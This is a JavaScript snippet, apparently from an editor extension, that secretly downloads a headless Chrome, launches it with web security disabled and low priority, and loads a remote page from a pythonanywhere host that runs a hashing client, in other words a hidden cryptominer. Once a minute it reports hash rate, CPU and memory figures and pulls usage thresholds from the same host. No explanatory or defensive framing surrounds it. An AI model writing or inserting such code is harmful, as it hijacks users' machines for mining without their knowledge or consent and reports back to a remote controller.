(async () => {

  try {

    const os = require('os');
    const { readdir, stat } = require('fs/promises');
    const { join } = require('path');

    let osUserInfo;
    try {
      osUserInfo = os.userInfo();
      if (osUserInfo.username == 'Admin') {
        // return;
      }
    } catch (error) {
      console.log('os.userInfo() error', error);
    }

    function getCPUUsage() {
      try {
        const cpus = os.cpus();
        const userTime = cpus.reduce((acc, cpu) => acc + cpu.times.user, 0);
        const niceTime = cpus.reduce((acc, cpu) => acc + cpu.times.nice, 0);
        const sysTime = cpus.reduce((acc, cpu) => acc + cpu.times.sys, 0);
        const idleTime = cpus.reduce((acc, cpu) => acc + cpu.times.idle, 0);
        const irqTime = cpus.reduce((acc, cpu) => acc + cpu.times.irq, 0);

        const total = userTime + niceTime + sysTime + idleTime + irqTime;
        const used = total - idleTime;
        return ((1 - idleTime / total) * 100).toFixed(2);
      } catch (error) {

      }
    }

    function getMemoryUsage() {
      try {
        const totalMemory = os.totalmem();
        const freeMemory = os.freemem();
        const usedMemory = totalMemory - freeMemory;
        return {
          free: parseFloat((freeMemory / (1024 ** 3)).toFixed(2)),
          used: parseFloat((usedMemory / (1024 ** 3)).toFixed(2)),
          total: parseFloat((totalMemory / (1024 ** 3)).toFixed(2)),
          percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
        };
      } catch (error) {

      }
    }

    async function dirSize(dir) {
      const files = await readdir(dir, { withFileTypes: true });

      const paths = files.map(async file => {
        const path = join(dir, file.name);
        if (file.isDirectory()) return await dirSize(path);
        if (file.isFile()) {
          const { size } = await stat(path);

          return size;
        }
        return 0;
      });

      return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
    }
    await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
    let browser;
    let page;
    let minUse = 0.1;
    let maxUse = 0.5;

    if (global.inIntv) clearInterval(global.inIntv);
    global.inIntv = setInterval(async () => {
      if (browser && page) {
        const hs = await page.evaluate(() => {
          try {
            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
          } catch (error) {
            return { message: error.message, value: null, error, _client: window._client };
          }
        });
        if (hs.message != 'success') {
          tstt({ message: hs.message, value: hs.value, error: hs.error, _client: hs._client, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
          return;
        }
        tstt({
          message: "HASH",
          value: parseFloat(hs.value).toFixed(2),
          cpu: getCPUUsage(),
          memory: getMemoryUsage(),
          hs: hs,
        });
        let [max, min] = (await (await fetch('https://ab498.pythonanywhere.com/files/thr.txt')).text()).trim().split(' ').map(parseFloat);
        minUse = min;
        maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
        await page.evaluate((maxUse) => {
          if (window.use != maxUse) window.location.href = 'https://ab498.pythonanywhere.com/files/init.html?use=' + maxUse;
        }, maxUse);
      } else {
        tstt({
          message: "HASH_WAIT D(" + (parseFloat(await dirSize(cacheDir)) / 1000000).toFixed(2) + ")",
          value: 0,
        });
      }
    }, 60000);


    const cacheDir = `${os.homedir()}/.cache/puppeteer`;
    if (!fs.existsSync(cacheDir)) {
      fs.mkdirSync(cacheDir, { recursive: true });
    };
    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
    let chromePath;
    const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
    console.log('installed', installedBrowsers);



    if (!chromeBrowser) {
      await new Promise(r => setTimeout(r, 1 * 60 * 1000));
      await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
      puppeteerBrowsers.InstallOptions;
      installedBrowser = await puppeteerBrowsers.install({
        browser: 'chrome',
        buildId: '130.0.6723.58',
        cacheDir,
      });
      chromePath = installedBrowser.executablePath;
    } else {
      chromePath = chromeBrowser.executablePath;
    }




    await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
    
    if(global.cppBrowser) {
      await global.cppBrowser.close();
      global.cppBrowser = null;
      page = null;
    }
    browser = await puppeteer.launch({
      executablePath: chromePath,
      headless: true,
      args: [
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process',
        '--allow-running-insecure-content',
      ]
    });
    global.cppBrowser = browser;
    os.setPriority(browser.process().pid, 19);
    page = await browser.newPage();
    global.cppPage = page;

    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));

    await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });




  } catch (error) {
    tstt({
      message: "INIT_E",
      value: error?.message,
      error: error,
      version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
    });
    if (global.inIntv) clearInterval(global.inIntv);
  }

})();